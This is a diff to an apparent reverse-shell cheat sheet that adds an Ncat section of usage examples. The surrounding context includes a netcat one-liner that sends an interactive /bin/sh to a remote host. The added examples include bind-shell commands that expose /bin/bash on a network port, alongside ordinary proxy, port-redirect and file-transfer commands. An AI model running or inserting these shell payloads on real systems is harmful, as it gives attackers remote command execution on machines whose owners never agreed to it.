@@ -68,6 +68,45 @@ If you have the wrong version of netcat installed, [Jeff Price points out here](
 
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
 
+## Ncat
+Ncat's vast number of features there is the ability to chain Ncats together; redirection of TCP, UDP, and SCTP ports to other sites; SSL support; and proxy connections via SOCKS4, SOCKS5 or HTTP proxies (with optional proxy authentication as well). Some general 
+ principles apply to most applications and thus give you the capability of instantly adding networking support to software that would normally never support it.
+
+```bash
+Connect to example.org on TCP port 8080.
+    ncat example.org 8080
+	
+Listen for connections on TCP port 8080.
+    ncat -l 8080
+	
+Redirect TCP port 8080 on the local machine to host on port 80.
+    ncat --sh-exec "ncat example.org 80" -l 8080 --keep-open
+	
+Bind to TCP port 8081 and attach /bin/bash for the world to access freely.
+    ncat --exec "/bin/bash" -l 8081 --keep-open
+	
+Bind a shell to TCP port 8081, limit access to hosts on a local network, and limit the maximum number of simultaneous connections to 3.
+	ncat --exec "/bin/bash" --max-conns 3 --allow 192.168.0.0/24 -l 8081 --keep-open
+
+Connect to smtphost:25 through a SOCKS4 server on port 1080.
+    ncat --proxy socks4host --proxy-type socks4 --proxy-auth joe smtphost 25
+	
+Connect to smtphost:25 through a SOCKS5 server on port 1080.
+    ncat --proxy socks5host --proxy-type socks5 --proxy-auth joe:secret smtphost 25
+	
+Create an HTTP proxy server on localhost port 8888.
+    ncat -l --proxy-type http localhost 8888
+	
+Send a file over TCP port 9899 from host2 (client) to host1 (server).
+    HOST1$ ncat -l 9899 > outputfile
+    HOST2$ ncat HOST1 9899 < inputfile
+	
+Transfer in the other direction, turning Ncat into a “one file” server.
+    HOST1$ ncat -l 9899 < inputfile
+    HOST2$ ncat HOST1 9899 > outputfile
+```
+
+
 ### Java
 
 ````java
